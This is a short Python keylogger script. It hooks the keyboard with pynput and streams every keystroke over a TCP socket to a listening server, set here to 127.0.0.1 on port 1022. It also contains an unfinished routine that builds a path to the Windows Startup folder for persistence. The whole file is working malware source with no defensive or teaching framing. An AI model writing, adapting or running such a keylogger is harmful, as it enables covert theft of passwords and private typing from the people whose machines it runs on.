from pynput import keyboard
from getpass import getuser
from shutil import copy
import socket
import os

# This Function For Copy File To Startup Path
def startup():
    username=getuser()
    drive=os.getcwd().split('\\')[0]
    path=f'{drive}\\users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\'


startup()
host='127.0.0.1'
port=1022
sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((host, port))
print('[+] Connected To Server Host !')

def on_press(key):
    # if key == keyboard.Key.esc:  # This line for Handling Keylogger; if pressed key is "Esc"
        # return False             # Connection close and Finish Job!
    try:
        sock.send(bytes(str(key).encode('utf-8')))
    except Exception as e:
        sock.send(bytes(str(e).encode('utf-8')))

with keyboard.Listener(on_press=on_press) as listen:
    try:
        listen.join()
    except Exception as error:
        print(str(error))
